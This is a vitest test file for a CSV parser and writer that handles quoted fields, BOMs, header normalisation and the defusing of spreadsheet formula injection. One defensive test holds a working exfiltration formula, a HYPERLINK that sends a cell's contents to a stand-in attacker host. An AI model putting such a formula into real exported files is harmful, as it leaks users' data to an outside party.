import { describe, expect, it } from 'vitest';
import {
  CsvError,
  normaliseHeader,
  parseCsv,
  parseCsvRows,
  toCsv,
  toCsvCell,
} from './csv';

/**
 * What an operator uploads is a file exported from Excel or Google Sheets,
 * which means quoted fields, embedded commas, embedded newlines and a BOM.
 * A parser that splits on commas would mangle every address in the file and
 * do it silently, so those are the cases pinned hardest.
 */

describe('parseCsvRows', () => {
  it('reads a plain file', () => {
    expect(parseCsvRows('a,b\n1,2')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
  });

  it('keeps a comma inside a quoted field', () => {
    // Every address in the file depends on this.
    expect(parseCsvRows('name,address\n"Smith","1 High St, London"')).toEqual([
      ['name', 'address'],
      ['Smith', '1 High St, London'],
    ]);
  });

  it('keeps a newline inside a quoted field', () => {
    const rows = parseCsvRows('name,address\n"Smith","1 High St\nLondon"');
    expect(rows).toHaveLength(2);
    expect(rows[1]![1]).toBe('1 High St\nLondon');
  });

  it('unescapes a doubled quote', () => {
    expect(parseCsvRows('note\n"He said ""no"""')).toEqual([
      ['note'],
      ['He said "no"'],
    ]);
  });

  it('handles CRLF, LF and a lone CR', () => {
    for (const newline of ['\r\n', '\n', '\r']) {
      expect(parseCsvRows(`a,b${newline}1,2`), newline).toEqual([
        ['a', 'b'],
        ['1', '2'],
      ]);
    }
  });

  it('strips the BOM Excel writes', () => {
    // Left in place it becomes part of the first heading, and "reference"
    // silently stops matching.
    const rows = parseCsvRows('﻿reference,name\nDRV-1,Sam');
    expect(rows[0]![0]).toBe('reference');
  });

  it('does not invent a row from a trailing newline', () => {
    expect(parseCsvRows('a,b\n1,2\n')).toHaveLength(2);
    expect(parseCsvRows('a,b\r\n1,2\r\n')).toHaveLength(2);
  });

  it('keeps empty trailing fields', () => {
    expect(parseCsvRows('a,b,c\n1,,')).toEqual([
      ['a', 'b', 'c'],
      ['1', '', ''],
    ]);
  });

  it('refuses a file that ends inside a quote', () => {
    expect(() => parseCsvRows('a\n"unclosed')).toThrow(CsvError);
  });
});

describe('normaliseHeader', () => {
  it('folds case, spacing and punctuation', () => {
    // Spreadsheets are edited by people.
    for (const header of ['Registration', 'registration', ' REGISTRATION ']) {
      expect(normaliseHeader(header), header).toBe('registration');
    }
    expect(normaliseHeader('Reg. Number')).toBe('regnumber');
    expect(normaliseHeader('PHV badge expiry')).toBe('phvbadgeexpiry');
  });
});

describe('parseCsv', () => {
  it('keys rows by normalised header and trims values', () => {
    const parsed = parseCsv('Name , Phone\n  Sam  , 07700 900123 ');
    expect(parsed.headers).toEqual(['name', 'phone']);
    expect(parsed.rows).toEqual([{ name: 'Sam', phone: '07700 900123' }]);
  });

  it('reports the line number a row came from', () => {
    // The report has to say which row to go and fix.
    const parsed = parseCsv('name\nSam\nAlex');
    expect(parsed.lineNumbers).toEqual([2, 3]);
  });

  it('drops entirely blank rows without calling them errors', () => {
    // A spreadsheet export routinely has a few. Reporting them would bury
    // the rows that actually need attention.
    const parsed = parseCsv('name,phone\nSam,07700900123\n,\n\nAlex,07700900124');
    expect(parsed.rows).toHaveLength(2);
    expect(parsed.lineNumbers).toEqual([2, 5]);
  });

  it('pads a short row rather than shifting its values', () => {
    const parsed = parseCsv('name,phone,email\nSam,07700900123');
    expect(parsed.rows[0]).toEqual({
      name: 'Sam',
      phone: '07700900123',
      email: '',
    });
  });

  it('refuses an empty file', () => {
    expect(() => parseCsv('')).toThrow(CsvError);
  });

  it('refuses duplicate headings', () => {
    // Silently keeping the last would lose a column of data.
    expect(() => parseCsv('name,name\na,b')).toThrow(/more than once/);
  });

  it('refuses a file with no headings at all', () => {
    expect(() => parseCsv(',,\n1,2,3')).toThrow(/column headings/);
  });

  it('ignores an unnamed column rather than keying on empty string', () => {
    const parsed = parseCsv('name,,phone\nSam,junk,07700900123');
    expect(parsed.headers).toEqual(['name', 'phone']);
    expect(parsed.rows[0]).toEqual({ name: 'Sam', phone: '07700900123' });
  });
});

describe('toCsv', () => {
  it('quotes only what needs quoting', () => {
    expect(toCsvCell('plain')).toBe('plain');
    expect(toCsvCell('has,comma')).toBe('"has,comma"');
    expect(toCsvCell('has"quote')).toBe('"has""quote"');
    expect(toCsvCell('has\nnewline')).toBe('"has\nnewline"');
    expect(toCsvCell(null)).toBe('');
    expect(toCsvCell(0)).toBe('0');
  });

  it('writes a header row and CRLF line endings', () => {
    const csv = toCsv(
      ['name', 'phone'],
      [{ name: 'Sam', phone: '07700900123' }],
    );
    expect(csv).toBe('name,phone\r\nSam,07700900123\r\n');
  });

  it('round-trips through the parser', () => {
    // The template a customer downloads has to come back in cleanly.
    const rows = [
      { name: 'Smith, J', address: '1 High St\nLondon', note: 'said "yes"' },
    ];
    const parsed = parseCsv(toCsv(['name', 'address', 'note'], rows));
    expect(parsed.rows[0]).toEqual(rows[0]);
  });

  it('leaves a missing key as an empty cell', () => {
    expect(toCsv(['a', 'b'], [{ a: '1' }])).toBe('a,b\r\n1,\r\n');
  });

  describe('formula injection', () => {
    /*
     * A CSV is not just data. Excel, LibreOffice and Sheets evaluate a cell
     * beginning `=`, `+`, `-` or `@` the moment the file opens — and the
     * values here are typed by people: a client name, a job note, an import
     * error quoting the row that caused it.
     *
     * A leading apostrophe is the fix every spreadsheet understands as
     * "this is text", and does not display.
     */
    it('defuses every character a spreadsheet would execute', () => {
      expect(toCsvCell('=1+1')).toBe("'=1+1");
      expect(toCsvCell('+1')).toBe("'+1");
      expect(toCsvCell('-1+1')).toBe("'-1+1");
      expect(toCsvCell('@SUM(A1)')).toBe("'@SUM(A1)");
      // Excel strips leading whitespace before deciding, so these are live
      // too. A tab needs no CSV quoting; a carriage return does, so that one
      // comes back wrapped as well.
      expect(toCsvCell('\t=1+1')).toBe("'\t=1+1");
      expect(toCsvCell('\r=1+1')).toBe('"\'\r=1+1"');
    });

    it('defuses a real payload rather than only the shape of one', () => {
      const attack = '=HYPERLINK("http://evil.example.net?x="&A1,"Invoice")';
      const cell = toCsvCell(attack);
      // Quoted, because it carries a comma and quotes — so the apostrophe
      // sits inside the quoting rather than before it.
      expect(cell.startsWith(`"'=`)).toBe(true);
      // And the cell no longer opens with a bare `=` once unquoted.
      expect(cell.replace(/^"/, '').startsWith("'=")).toBe(true);
    });

    it('leaves ordinary text and numbers exactly as they were', () => {
      // The guard must not become a nuisance: an operator reading the export
      // should see what they typed.
      expect(toCsvCell('Smith & Co')).toBe('Smith & Co');
      expect(toCsvCell('07700900123')).toBe('07700900123');
      expect(toCsvCell('£125.50')).toBe('£125.50');
      // Numbers come from the application, never a text field. Prefixing them
      // would turn every amount in the sheet into a string.
      expect(toCsvCell(-500)).toBe('-500');
      expect(toCsvCell(0)).toBe('0');
    });
  });
});
